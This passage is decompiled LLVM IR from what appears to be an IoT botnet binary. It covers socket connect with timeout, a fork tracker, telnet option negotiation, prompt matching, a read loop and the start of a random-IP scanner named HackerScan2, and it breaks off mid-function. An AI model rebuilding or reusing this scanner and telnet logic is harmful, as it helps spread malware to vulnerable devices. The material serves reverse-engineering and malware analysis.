  %v2_9ec8 = icmp eq i32 %v3_9ec0, 0
  br i1 %v2_9ec8, label %dec_label_pc_9edc, label %dec_label_pc_9ed0

dec_label_pc_9ed0:                                ; preds = %entry
  br label %dec_label_pc_a094

dec_label_pc_9edc:                                ; preds = %entry
  %v3_9ef0 = bitcast i32* %stack_var_-40 to i8*
  %v4_9ef0 = call i32 @__GI_memset(i8* %v3_9ef0, i32 0, i32 8)
  %v2_9ef4 = ptrtoint i32* %stack_var_-48 to i32
  %v3_9f04 = call i32 @__libc_connect(i32 %arg1, i32 %v2_9ef4, i32 16)
  store i32 %v3_9f04, i32* @r3, align 4
  %v1_9f14 = icmp slt i32 %v3_9f04, 0
  br i1 %v1_9f14, label %dec_label_pc_9f1c, label %dec_label_pc_a058

dec_label_pc_9f1c:                                ; preds = %dec_label_pc_9edc
  %v0_9f1c = call i32 @__GI___errno_location()
  %v1_9f24 = inttoptr i32 %v0_9f1c to i32*
  %v2_9f24 = load i32, i32* %v1_9f24, align 4
  %v7_9f28 = icmp eq i32 %v2_9f24, 115
  br i1 %v7_9f28, label %dec_label_pc_9f54.lr.ph, label %dec_label_pc_a04c

dec_label_pc_9f54.lr.ph:                          ; preds = %dec_label_pc_9f1c
  store i32 %arg4, i32* %stack_var_-184, align 4
  %v2_9f40 = ptrtoint i32* %stack_var_-176 to i32
  br label %dec_label_pc_9f54

dec_label_pc_9f54:                                ; preds = %dec_label_pc_9f54.lr.ph, %dec_label_pc_9f54
  %storemerge14 = phi i32 [ 0, %dec_label_pc_9f54.lr.ph ], [ %v1_9f68, %dec_label_pc_9f54 ]
  %v5_9f60 = mul nuw nsw i32 %storemerge14, 4
  %v6_9f60 = add i32 %v5_9f60, %v2_9f40
  %v7_9f60 = inttoptr i32 %v6_9f60 to i32*
  store i32 0, i32* %v7_9f60, align 4
  %v1_9f68 = add nuw nsw i32 %storemerge14, 1
  %tmp28 = icmp ult i32 %v1_9f68, 32
  br i1 %tmp28, label %dec_label_pc_9f54, label %dec_label_pc_9f7c

dec_label_pc_9f7c:                                ; preds = %dec_label_pc_9f54
  %v3_9f80 = udiv i32 %arg1, 32
  %v3_9f8c = mul nuw nsw i32 %v3_9f80, 4
  %v2_9f94 = add nsw i32 %v3_9f8c, -160
  %v2_9f98 = add i32 %v2_9f94, %v13_9e38
  %v1_9f9c = inttoptr i32 %v2_9f98 to i32*
  %v2_9f9c = load i32, i32* %v1_9f9c, align 4
  %v1_9fa4 = urem i32 %arg1, 32
  %v6_9fac = shl i32 1, %v1_9fa4
  %v2_9fb0 = or i32 %v2_9f9c, %v6_9fac
  store i32 %v2_9fb0, i32* %v1_9f9c, align 4
  %v1_9fd0 = add i32 %arg1, 1
  %v2_9fd8 = ptrtoint i32* %stack_var_-184 to i32
  %v5_9ff0 = call i32 @__libc_select(i32 %v1_9fd0, i32 0, i32 %v2_9f40, i32 0, i32 %v2_9fd8)
  %tmp29 = icmp slt i32 %v5_9ff0, 1
  br i1 %tmp29, label %dec_label_pc_a040, label %dec_label_pc_a000

dec_label_pc_a000:                                ; preds = %dec_label_pc_9f7c
  store i32 4, i32* %stack_var_-188, align 4
  %v2_a008 = ptrtoint i32* %stack_var_-192 to i32
  %v2_a00c = ptrtoint i32* %stack_var_-188 to i32
  %v5_a024 = call i32 @getsockopt(i32 %arg1, i32 1, i32 4, i32 %v2_a008, i32 %v2_a00c)
  %v3_a028 = load i32, i32* %stack_var_-192, align 4
  store i32 %v3_a028, i32* @r3, align 4
  %v2_a02c = icmp eq i32 %v3_a028, 0
  br i1 %v2_a02c, label %dec_label_pc_a058, label %dec_label_pc_a034

dec_label_pc_a034:                                ; preds = %dec_label_pc_a000
  br label %dec_label_pc_a094

dec_label_pc_a040:                                ; preds = %dec_label_pc_9f7c
  br label %dec_label_pc_a094

dec_label_pc_a04c:                                ; preds = %dec_label_pc_9f1c
  br label %dec_label_pc_a094

dec_label_pc_a058:                                ; preds = %dec_label_pc_9edc, %dec_label_pc_a000
  store i32 0, i32* @r2, align 4
  %v2_a064 = call i32 @__libc_fcntl(i32 %arg1, i32 3)
  %v1_a074 = and i32 %v2_a064, -2049
  store i32 %v1_a074, i32* @r3, align 4
  store i32 %v1_a074, i32* @r2, align 4
  %v2_a088 = call i32 @__libc_fcntl(i32 %arg1, i32 4)
  br label %dec_label_pc_a094

dec_label_pc_a094:                                ; preds = %dec_label_pc_a04c, %dec_label_pc_a040, %dec_label_pc_a034, %dec_label_pc_9ed0, %dec_label_pc_a058
  %stack_var_-212.0 = phi i32 [ 0, %dec_label_pc_a040 ], [ 1, %dec_label_pc_a058 ], [ 0, %dec_label_pc_a034 ], [ 0, %dec_label_pc_a04c ], [ 0, %dec_label_pc_9ed0 ]
  ret i32 %stack_var_-212.0

; uselistorder directives
  uselistorder i32 %storemerge14, { 1, 0 }
  uselistorder i32 %v2_9f40, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-48, { 1, 0 }
  uselistorder i32* %stack_var_-184, { 1, 0 }
  uselistorder i32* %stack_var_-188, { 1, 0 }
  uselistorder i32 %arg1, { 2, 3, 4, 5, 1, 0, 6, 7, 8 }
  uselistorder label %dec_label_pc_a094, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_a058, { 1, 0 }
  uselistorder label %dec_label_pc_9f54, { 1, 0 }
}

define i32 @listFork() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v3_a0ac = load i32, i32* @r4, align 4
  %v6_a0ac = load i32, i32* @r5, align 4
  %v9_a0ac = load i32, i32* @r6, align 4
  %v12_a0ac = load i32, i32* @fp, align 4
  store i32 41140, i32* %stack_var_-4, align 4
  %v2_a0b0 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_a0b0, i32* @fp, align 4
  %v0_a0b8 = call i32 @__libc_fork()
  %v2_a0c8 = icmp eq i32 %v0_a0b8, 0
  br i1 %v2_a0c8, label %dec_label_pc_a234, label %dec_label_pc_a0dc

dec_label_pc_a0dc:                                ; preds = %entry
  %v2_a0e0 = load i32, i32* @global_var_42c68.69, align 4
  %v5_a0e0 = load i32, i32* @global_var_42c6c.70, align 4
  %v2_a0ec = add i32 %v2_a0e0, 1
  %v3_a0ec = icmp eq i32 %v2_a0ec, 0
  %v4_a0f0 = zext i1 %v3_a0ec to i32
  %v5_a0f0 = add i32 %v4_a0f0, %v5_a0e0
  store i32 %v2_a0ec, i32* @global_var_42c68.69, align 4
  store i32 %v5_a0f0, i32* @global_var_42c6c.70, align 4
  %v2_a10c = add i32 %v2_a0e0, 2
  %v3_a10c = icmp eq i32 %v2_a0ec, -1
  %v4_a110 = zext i1 %v3_a10c to i32
  %v5_a110 = add i32 %v5_a0f0, %v4_a110
  %v3_a114 = udiv i32 %v2_a10c, 1073741824
  %v3_a118 = mul i32 %v5_a110, 4
  %v2_a11c = or i32 %v3_a118, %v3_a114
  store i32 %v2_a11c, i32* @r4, align 4
  %v3_a120 = mul i32 %v2_a10c, 4
  %v1_a128 = call i32 @malloc(i32 %v3_a120)
  br label %dec_label_pc_a180

dec_label_pc_a140:                                ; preds = %dec_label_pc_a180, %dec_label_pc_a1cc
  %v3_a144 = mul i32 %storemerge2, 4
  %v2_a150 = add i32 %v3_a144, %v1_a128
  %v2_a164 = load i32, i32* @global_var_49990.72, align 4
  %v2_a168 = add i32 %v2_a164, %v3_a144
  %v1_a16c = inttoptr i32 %v2_a168 to i32*
  %v2_a16c = load i32, i32* %v1_a16c, align 4
  %v2_a170 = inttoptr i32 %v2_a150 to i32*
  store i32 %v2_a16c, i32* %v2_a170, align 4
  %v1_a178 = add i32 %storemerge2, 1
  br label %dec_label_pc_a180

dec_label_pc_a180:                                ; preds = %dec_label_pc_a0dc, %dec_label_pc_a140
  %storemerge2 = phi i32 [ 0, %dec_label_pc_a0dc ], [ %v1_a178, %dec_label_pc_a140 ]
  %v2_a198 = load i32, i32* @global_var_42c68.69, align 4
  %v5_a198 = load i32, i32* @global_var_42c6c.70, align 4
  %v2_a1ac = add i32 %v2_a198, -1
  %v3_a1ac = icmp ne i32 %v2_a198, 0
  %v3_a1b0 = add i32 %v5_a198, -1
  %v5_a1b0 = sext i1 %v3_a1ac to i32
  %v9_a1c4 = icmp eq i32 %v3_a1b0, %v5_a1b0
  br i1 %v9_a1c4, label %dec_label_pc_a1cc, label %dec_label_pc_a140

dec_label_pc_a1cc:                                ; preds = %dec_label_pc_a180
  store i32 %v2_a1ac, i32* @r5, align 4
  store i32 %storemerge2, i32* @r6, align 4
  %tmp = icmp ugt i32 %v2_a1ac, %storemerge2
  br i1 %tmp, label %dec_label_pc_a140, label %dec_label_pc_a1ec

dec_label_pc_a1ec:                                ; preds = %dec_label_pc_a1cc
  store i32 %v5_a198, i32* @r4, align 4
  %v3_a1f4 = mul i32 %v2_a198, 4
  %v1_a1f8 = add i32 %v1_a128, -4
  %v2_a204 = add i32 %v1_a1f8, %v3_a1f4
  %v2_a20c = inttoptr i32 %v2_a204 to i32*
  store i32 %v0_a0b8, i32* %v2_a20c, align 4
  %v2_a214 = load i32, i32* @global_var_49990.72, align 4
  store i32 %v2_a214, i32* @r0, align 4
  %v0_a21c = call i32 @free()
  store i32 ptrtoint (i32* @global_var_49990.72 to i32), i32* @r2, align 4
  store i32 %v1_a128, i32* @global_var_49990.72, align 4
  br label %dec_label_pc_a234

dec_label_pc_a234:                                ; preds = %entry, %dec_label_pc_a1ec
  store i32 %v3_a0ac, i32* @r4, align 4
  store i32 %v6_a0ac, i32* @r5, align 4
  store i32 %v9_a0ac, i32* @r6, align 4
  store i32 %v12_a0ac, i32* @fp, align 4
  ret i32 %v0_a0b8

; uselistorder directives
  uselistorder i32 %storemerge2, { 0, 2, 1, 3 }
  uselistorder i32 %v3_a144, { 1, 0 }
  uselistorder i32 %v1_a128, { 2, 0, 1 }
  uselistorder i32 %v2_a0ec, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_a234, { 1, 0 }
  uselistorder label %dec_label_pc_a180, { 1, 0 }
  uselistorder label %dec_label_pc_a140, { 1, 0 }
}

define i32 @negotiate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-17 = alloca i8, align 1
  %v1_a270 = add i32 %arg2, 1
  %v1_a274 = inttoptr i32 %v1_a270 to i8*
  %v2_a274 = load i8, i8* %v1_a274, align 1
  %v7_a280 = icmp ult i8 %v2_a274, -5
  br i1 %v7_a280, label %dec_label_pc_a3cc, label %dec_label_pc_a288

dec_label_pc_a288:                                ; preds = %entry
  %v7_a290 = icmp eq i8 %v2_a274, -1
  br i1 %v7_a290, label %dec_label_pc_a294, label %dec_label_pc_a2b0

dec_label_pc_a294:                                ; preds = %dec_label_pc_a288
  br label %dec_label_pc_a3cc

dec_label_pc_a2b0:                                ; preds = %dec_label_pc_a288
  store i8 -1, i8* %stack_var_-17, align 1
  %v2_a2b8 = ptrtoint i8* %stack_var_-17 to i32
  %v5_a2cc = call i32 @__libc_send(i32 %arg1, i32 %v2_a2b8, i32 1, i32 16384)
  %v2_a2d8 = load i8, i8* %v1_a274, align 1
  %v7_a2dc = icmp eq i8 %v2_a2d8, -4
  br i1 %v7_a2dc, label %dec_label_pc_a2e4, label %dec_label_pc_a2f0

dec_label_pc_a2e4:                                ; preds = %dec_label_pc_a2b0
  store i8 -2, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a390

dec_label_pc_a2f0:                                ; preds = %dec_label_pc_a2b0
  %v2_a2f8 = load i8, i8* %v1_a274, align 1
  %v7_a2fc = icmp eq i8 %v2_a2f8, -2
  br i1 %v7_a2fc, label %dec_label_pc_a304, label %dec_label_pc_a310

dec_label_pc_a304:                                ; preds = %dec_label_pc_a2f0
  store i8 -4, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a390

dec_label_pc_a310:                                ; preds = %dec_label_pc_a2f0
  %v2_a318 = load i8, i8* %v1_a274, align 1
  %v7_a31c = icmp eq i8 %v2_a318, 3
  %v7_a330 = icmp eq i8 %v2_a318, -3
  br i1 %v7_a31c, label %dec_label_pc_a324, label %dec_label_pc_a35c

dec_label_pc_a324:                                ; preds = %dec_label_pc_a310
  br i1 %v7_a330, label %dec_label_pc_a338, label %dec_label_pc_a344

dec_label_pc_a338:                                ; preds = %dec_label_pc_a324
  br label %dec_label_pc_a34c

dec_label_pc_a344:                                ; preds = %dec_label_pc_a324
  br label %dec_label_pc_a34c

dec_label_pc_a34c:                                ; preds = %dec_label_pc_a338, %dec_label_pc_a344
  %storemerge = phi i8 [ -3, %dec_label_pc_a344 ], [ -5, %dec_label_pc_a338 ]
  store i8 %storemerge, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a390

dec_label_pc_a35c:                                ; preds = %dec_label_pc_a310
  br i1 %v7_a330, label %dec_label_pc_a370, label %dec_label_pc_a37c

dec_label_pc_a370:                                ; preds = %dec_label_pc_a35c
  br label %dec_label_pc_a384

dec_label_pc_a37c:                                ; preds = %dec_label_pc_a35c
  br label %dec_label_pc_a384

dec_label_pc_a384:                                ; preds = %dec_label_pc_a370, %dec_label_pc_a37c
  %storemerge4 = phi i8 [ -2, %dec_label_pc_a37c ], [ -4, %dec_label_pc_a370 ]
  store i8 %storemerge4, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a390

dec_label_pc_a390:                                ; preds = %dec_label_pc_a34c, %dec_label_pc_a304, %dec_label_pc_a2e4, %dec_label_pc_a384
  %v4_a3a4 = call i32 @__libc_send(i32 %arg1, i32 %v2_a2b8, i32 1, i32 16384)
  %v1_a3ac = add i32 %arg2, 2
  %v4_a3c0 = call i32 @__libc_send(i32 %arg1, i32 %v1_a3ac, i32 1, i32 16384)
  br label %dec_label_pc_a3cc

dec_label_pc_a3cc:                                ; preds = %dec_label_pc_a294, %dec_label_pc_a390, %entry
  ret i32 0

; uselistorder directives
  uselistorder i8* %stack_var_-17, { 5, 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_a3cc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_a390, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_a384, { 1, 0 }
  uselistorder label %dec_label_pc_a34c, { 1, 0 }
}

define i32 @matchPrompt(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_a400 = call i32 @strlen(i8* %arg1)
  %v2_a448 = add i32 %v3_a400, %tmp
  br label %dec_label_pc_a51c

dec_label_pc_a420:                                ; preds = %dec_label_pc_a4a8, %dec_label_pc_a484, %dec_label_pc_a460, %dec_label_pc_a43c
  %v1_a424 = add nsw i32 %stack_var_-28.014, 1
  %v7_a438 = icmp sgt i32 %v3_a400, %v1_a424
  br i1 %v7_a438, label %dec_label_pc_a43c, label %dec_label_pc_a4cc

dec_label_pc_a43c:                                ; preds = %dec_label_pc_a42c.preheader, %dec_label_pc_a420
  %stack_var_-28.014 = phi i32 [ %v1_a424, %dec_label_pc_a420 ], [ %stack_var_-28.1, %dec_label_pc_a42c.preheader ]
  %v2_a450 = sub i32 %v2_a448, %stack_var_-28.014
  %v1_a454 = inttoptr i32 %v2_a450 to i8*
  %v2_a454 = load i8, i8* %v1_a454, align 1
  %v2_a458 = icmp eq i8 %v2_a454, 0
  br i1 %v2_a458, label %dec_label_pc_a420, label %dec_label_pc_a460

dec_label_pc_a460:                                ; preds = %dec_label_pc_a43c
  %v2_a478 = load i8, i8* %v1_a454, align 1
  %v7_a47c = icmp eq i8 %v2_a478, 32
  br i1 %v7_a47c, label %dec_label_pc_a420, label %dec_label_pc_a484

dec_label_pc_a484:                                ; preds = %dec_label_pc_a460
  %v2_a49c = load i8, i8* %v1_a454, align 1
  %v7_a4a0 = icmp eq i8 %v2_a49c, 13
  br i1 %v7_a4a0, label %dec_label_pc_a420, label %dec_label_pc_a4a8

dec_label_pc_a4a8:                                ; preds = %dec_label_pc_a484
  %v2_a4c0 = load i8, i8* %v1_a454, align 1
  %v7_a4c4 = icmp eq i8 %v2_a4c0, 10
  br i1 %v7_a4c4, label %dec_label_pc_a420, label %dec_label_pc_a4cc

dec_label_pc_a4cc:                                ; preds = %dec_label_pc_a4a8, %dec_label_pc_a420, %dec_label_pc_a42c.preheader
  %stack_var_-28.0.lcssa = phi i32 [ %stack_var_-28.1, %dec_label_pc_a42c.preheader ], [ %stack_var_-28.014, %dec_label_pc_a4a8 ], [ %v1_a424, %dec_label_pc_a420 ]
  %v2_a4e0 = sub i32 %v2_a448, %stack_var_-28.0.lcssa
  %v1_a4e4 = inttoptr i32 %v2_a4e0 to i8*
  %v2_a4e4 = load i8, i8* %v1_a4e4, align 1
  %v2_a4f4 = add i32 %storemerge3, ptrtoint ([6 x i8]* @global_var_32614.74 to i32)
  %v1_a4f8 = inttoptr i32 %v2_a4f4 to i8*
  %v2_a4f8 = load i8, i8* %v1_a4f8, align 1
  %v9_a4fc = icmp eq i8 %v2_a4e4, %v2_a4f8
  %v1_a514 = add i32 %storemerge3, 1
  br i1 %v9_a4fc, label %dec_label_pc_a53c, label %dec_label_pc_a51c

dec_label_pc_a51c:                                ; preds = %dec_label_pc_a4cc, %entry
  %stack_var_-28.1 = phi i32 [ 0, %entry ], [ %stack_var_-28.0.lcssa, %dec_label_pc_a4cc ]
  %storemerge3 = phi i32 [ 0, %entry ], [ %v1_a514, %dec_label_pc_a4cc ]
  %v3_a524 = call i32 @strlen(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_32614.74, i32 0, i32 0))
  %v3_a52c = icmp ult i32 %storemerge3, %v3_a524
  br i1 %v3_a52c, label %dec_label_pc_a42c.preheader, label %dec_label_pc_a53c

dec_label_pc_a42c.preheader:                      ; preds = %dec_label_pc_a51c
  %v7_a43813 = icmp sgt i32 %v3_a400, %stack_var_-28.1
  br i1 %v7_a43813, label %dec_label_pc_a43c, label %dec_label_pc_a4cc

dec_label_pc_a53c:                                ; preds = %dec_label_pc_a51c, %dec_label_pc_a4cc
  %storemerge4 = phi i32 [ 1, %dec_label_pc_a4cc ], [ 0, %dec_label_pc_a51c ]
  ret i32 %storemerge4

; uselistorder directives
  uselistorder i32 %stack_var_-28.1, { 2, 0, 1 }
  uselistorder i32 %stack_var_-28.0.lcssa, { 1, 0 }
  uselistorder i32 %v3_a400, { 1, 2, 0 }
  uselistorder label %dec_label_pc_a4cc, { 2, 0, 1 }
}

define i32 @readUntil(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_a558 = load i32, i32* @fp, align 4
  store i32 %v3_a558, i32* %stack_var_-16, align 4
  %v13_a558 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg4, i32* %stack_var_-176, align 4
  %v2_a5a8 = ptrtoint i32* %stack_var_-168 to i32
  %v3_a5e8 = udiv i32 %arg1, 32
  %v3_a5f4 = mul nuw nsw i32 %v3_a5e8, 4
  %v1_a60c = urem i32 %arg1, 32
  %v6_a614 = shl i32 1, %v1_a60c
  %v1_a638 = add i32 %arg1, 1
  %v2_a640 = ptrtoint i32* %stack_var_-176 to i32
  %v6_a760 = inttoptr i32 %arg2 to i8*
  %v2_a774 = icmp eq i32 %arg3, 0
  %v1_a780 = inttoptr i32 %arg6 to i8*
  %v5_a7c4 = icmp sgt i32 %arg5, 0
  %v2_a5fc = add nsw i32 %v3_a5f4, -152
  %v2_a600 = add i32 %v2_a5fc, %v13_a558
  %v1_a604 = inttoptr i32 %v2_a600 to i32*
  br label %dec_label_pc_a79c

dec_label_pc_a5bc.lr.ph:                          ; preds = %dec_label_pc_a7b0, %dec_label_pc_a7bc
  br label %dec_label_pc_a5bc

dec_label_pc_a5bc:                                ; preds = %dec_label_pc_a5bc.lr.ph, %dec_label_pc_a5bc
  %storemerge27 = phi i32 [ 0, %dec_label_pc_a5bc.lr.ph ], [ %v1_a5d0, %dec_label_pc_a5bc ]
  %v5_a5c8 = mul nuw nsw i32 %storemerge27, 4
  %v6_a5c8 = add i32 %v5_a5c8, %v2_a5a8
  %v7_a5c8 = inttoptr i32 %v6_a5c8 to i32*
  store i32 0, i32* %v7_a5c8, align 4
  %v1_a5d0 = add nuw nsw i32 %storemerge27, 1
  %tmp30 = icmp ult i32 %v1_a5d0, 32
  br i1 %tmp30, label %dec_label_pc_a5bc, label %dec_label_pc_a5e4

dec_label_pc_a5e4:                                ; preds = %dec_label_pc_a5bc
  %v2_a604 = load i32, i32* %v1_a604, align 4
  %v2_a618 = or i32 %v2_a604, %v6_a614
  store i32 %v2_a618, i32* %v1_a604, align 4
  %v5_a654 = call i32 @__libc_select(i32 %v1_a638, i32 %v2_a5a8, i32 0, i32 0, i32 %v2_a640)
  %tmp31 = icmp slt i32 %v5_a654, 1
  br i1 %tmp31, label %dec_label_pc_a7e0, label %dec_label_pc_a664

dec_label_pc_a664:                                ; preds = %dec_label_pc_a5e4
  %v2_a670 = add i32 %stack_var_-40.0, %arg6
  %v5_a674 = inttoptr i32 %v2_a670 to i8*
  %v6_a688 = call i32 @__libc_recv(i32 %arg1, i32 %v2_a670, i32 1, i32 0, i32 %v2_a670)
  %v7_a698 = icmp eq i32 %v6_a688, -1
  br i1 %v7_a698, label %dec_label_pc_a6ac, label %dec_label_pc_a6a0

dec_label_pc_a6a0:                                ; preds = %dec_label_pc_a664
  %v2_a6a4 = icmp eq i32 %v6_a688, 0
  br i1 %v2_a6a4, label %dec_label_pc_a6ac, label %dec_label_pc_a6b8

dec_label_pc_a6ac:                                ; preds = %dec_label_pc_a6a0, %dec_label_pc_a664
  br label %dec_label_pc_a7e8

dec_label_pc_a6b8:                                ; preds = %dec_label_pc_a6a0
  %v2_a6c0 = add i32 %v6_a688, %stack_var_-40.0
  %v2_a6cc = load i8, i8* %v5_a674, align 1
  %v2_a6d0 = icmp eq i8 %v2_a6cc, -1
  br i1 %v2_a6d0, label %dec_label_pc_a6d8, label %dec_label_pc_a758

dec_label_pc_a6d8:                                ; preds = %dec_label_pc_a6b8
  %v1_a6dc = add i32 %v2_a670, 1
  %v5_a6f0 = call i32 @__libc_recv(i32 %arg1, i32 %v1_a6dc, i32 2, i32 0, i32 %v2_a6c0)
  %v7_a700 = icmp eq i32 %v5_a6f0, -1
  br i1 %v7_a700, label %dec_label_pc_a714, label %dec_label_pc_a708

dec_label_pc_a708:                                ; preds = %dec_label_pc_a6d8
  %v2_a70c = icmp eq i32 %v5_a6f0, 0
  br i1 %v2_a70c, label %dec_label_pc_a714, label %dec_label_pc_a720

dec_label_pc_a714:                                ; preds = %dec_label_pc_a708, %dec_label_pc_a6d8
  br label %dec_label_pc_a7e8

dec_label_pc_a720:                                ; preds = %dec_label_pc_a708
  %v2_a728 = add i32 %v5_a6f0, %v2_a6c0
  %v3_a73c = call i32 @negotiate(i32 %arg1, i32 %v2_a670, i32 3)
  %v2_a744 = icmp eq i32 %v3_a73c, 0
  br i1 %v2_a744, label %dec_label_pc_a74c, label %dec_label_pc_a79c

dec_label_pc_a74c:                                ; preds = %dec_label_pc_a720
  br label %dec_label_pc_a7e8

dec_label_pc_a758:                                ; preds = %dec_label_pc_a6b8
  %v7_a760 = call i32 @strstr(i32 %arg6, i8* %v6_a760)
  %v2_a768 = icmp eq i32 %v7_a760, 0
  br i1 %v2_a768, label %dec_label_pc_a770, label %dec_label_pc_a7d4

dec_label_pc_a770:                                ; preds = %dec_label_pc_a758
  br i1 %v2_a774, label %dec_label_pc_a79c, label %dec_label_pc_a77c

dec_label_pc_a77c:                                ; preds = %dec_label_pc_a770
  %v2_a780 = call i32 @matchPrompt(i8* %v1_a780)
  %v2_a788 = icmp eq i32 %v2_a780, 0
  br i1 %v2_a788, label %dec_label_pc_a79c, label %dec_label_pc_a7d4

dec_label_pc_a79c:                                ; preds = %dec_label_pc_a720, %dec_label_pc_a77c, %dec_label_pc_a770, %entry
  %stack_var_-40.0 = phi i32 [ %arg8, %entry ], [ %v2_a728, %dec_label_pc_a720 ], [ %v2_a6c0, %dec_label_pc_a770 ], [ %v2_a6c0, %dec_label_pc_a77c ]
  %v1_a7a0 = add i32 %stack_var_-40.0, 2
  %v6_a7ac = icmp slt i32 %v1_a7a0, %arg7
  br i1 %v6_a7ac, label %dec_label_pc_a7b0, label %dec_label_pc_a7e0

dec_label_pc_a7b0:                                ; preds = %dec_label_pc_a79c
  %v3_a7b0 = load i32, i32* %stack_var_-176, align 4
  %v5_a7b8 = icmp sgt i32 %v3_a7b0, 0
  br i1 %v5_a7b8, label %dec_label_pc_a5bc.lr.ph, label %dec_label_pc_a7bc

dec_label_pc_a7bc:                                ; preds = %dec_label_pc_a7b0
  br i1 %v5_a7c4, label %dec_label_pc_a5bc.lr.ph, label %dec_label_pc_a7e0

dec_label_pc_a7d4:                                ; preds = %dec_label_pc_a758, %dec_label_pc_a77c
  br label %dec_label_pc_a7e8

dec_label_pc_a7e0:                                ; preds = %dec_label_pc_a5e4, %dec_label_pc_a7bc, %dec_label_pc_a79c
  br label %dec_label_pc_a7e8

dec_label_pc_a7e8:                                ; preds = %dec_label_pc_a7d4, %dec_label_pc_a74c, %dec_label_pc_a714, %dec_label_pc_a6ac, %dec_label_pc_a7e0
  %stack_var_-196.0 = phi i32 [ 0, %dec_label_pc_a7e0 ], [ 1, %dec_label_pc_a7d4 ], [ 0, %dec_label_pc_a6ac ], [ 0, %dec_label_pc_a714 ], [ 0, %dec_label_pc_a74c ]
  ret i32 %stack_var_-196.0

; uselistorder directives
  uselistorder i32 %stack_var_-40.0, { 2, 1, 0 }
  uselistorder i32 %v5_a6f0, { 1, 2, 0 }
  uselistorder i32 %v6_a688, { 1, 2, 0 }
  uselistorder i32 %storemerge27, { 1, 0 }
  uselistorder i32 %v2_a5a8, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-176, { 0, 2, 1 }
  uselistorder i32 %arg6, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 3, 4, 5, 1, 0 }
  uselistorder label %dec_label_pc_a7e8, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_a7e0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_a7d4, { 1, 0 }
  uselistorder label %dec_label_pc_a79c, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_a5bc, { 1, 0 }
  uselistorder label %dec_label_pc_a5bc.lr.ph, { 1, 0 }
}

define i32 @HackerScan2(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_a800 = load i32, i32* @fp, align 4
  store i32 43016, i32* %stack_var_-4, align 4
  %v2_a804 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_a804, i32* @fp, align 4
  store i8 0, i8* bitcast (i32* @global_var_42c77.77 to i8*), align 4
  store i8 0, i8* @global_var_42c78.78, align 1
  store i8 0, i8* @global_var_42c79.79, align 1
  store i8 0, i8* bitcast (i32* @global_var_42c7a.80 to i8*), align 4
  %v0_a83c = call i32 @rand()
  %v2_a858 = sdiv i32 %v0_a83c, 51
  %tmp1273 = mul i32 %v2_a858, -255
  %v2_a870 = add i32 %tmp1273, %v0_a83c
  %v1_a884 = trunc i32 %v2_a870 to i8
  store i8 %v1_a884, i8* bitcast (i32* @global_var_42c77.77 to i8*), align 4
  %v0_a888 = call i32 @rand()
  %v2_a8a4 = sdiv i32 %v0_a888, 51
  %tmp1274 = mul i32 %v2_a8a4, -255
  %v2_a8bc = add i32 %tmp1274, %v0_a888
  %v1_a8d0 = trunc i32 %v2_a8bc to i8
  store i8 %v1_a8d0, i8* @global_var_42c78.78, align 1
  %v0_a8d4 = call i32 @rand()
  %v2_a8f0 = sdiv i32 %v0_a8d4, 51
  %tmp1275 = mul i32 %v2_a8f0, -255
  %v2_a908 = add i32 %tmp1275, %v0_a8d4
  %v1_a91c = trunc i32 %v2_a908 to i8
  store i8 %v1_a91c, i8* @global_var_42c79.79, align 1
  %v0_a920 = call i32 @rand()
  %v2_a93c = sdiv i32 %v0_a920, 51
  %tmp1276 = mul i32 %v2_a93c, -255
  %v2_a954 = add i32 %tmp1276, %v0_a920
  %v1_a968 = trunc i32 %v2_a954 to i8
  store i8 %v1_a968, i8* bitcast (i32* @global_var_42c7a.80 to i8*), align 4
  %v0_a96c = call i32 @rand()
  %v2_a984 = srem i32 %v0_a96c, 115
  %v2_a9b0 = icmp eq i32 %v2_a984, 0
  br i1 %v2_a9b0, label %dec_label_pc_a9b8, label %dec_label_pc_a9e0

dec_label_pc_a9b8:                                ; preds = %entry
  %v2_a9b8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_a9c4 = load i8, i8* @global_var_42c78.78, align 1
  %v3_a9d0 = load i8, i8* @global_var_42c79.79, align 1
  %v4_a9dc = sext i8 %v3_a9c4 to i32
  %v6_a9dc = sext i8 %v3_a9d0 to i32
  %v8_a9dc = call i32 @szprintf(i32 %v2_a9b8, i32 ptrtoint ([12 x i8]* @global_var_3261c.84 to i32), i32 %v4_a9dc, i32 %v6_a9dc, i32 0)
  br label %dec_label_pc_a9e0

dec_label_pc_a9e0:                                ; preds = %entry, %dec_label_pc_a9b8
  %v7_a9e4 = icmp eq i32 %v2_a984, 1
  br i1 %v7_a9e4, label %dec_label_pc_a9ec, label %dec_label_pc_aa14

dec_label_pc_a9ec:                                ; preds = %dec_label_pc_a9e0
  %v2_a9ec = ptrtoint i32* %stack_var_-36 to i32
  %v3_a9f8 = load i8, i8* @global_var_42c78.78, align 1
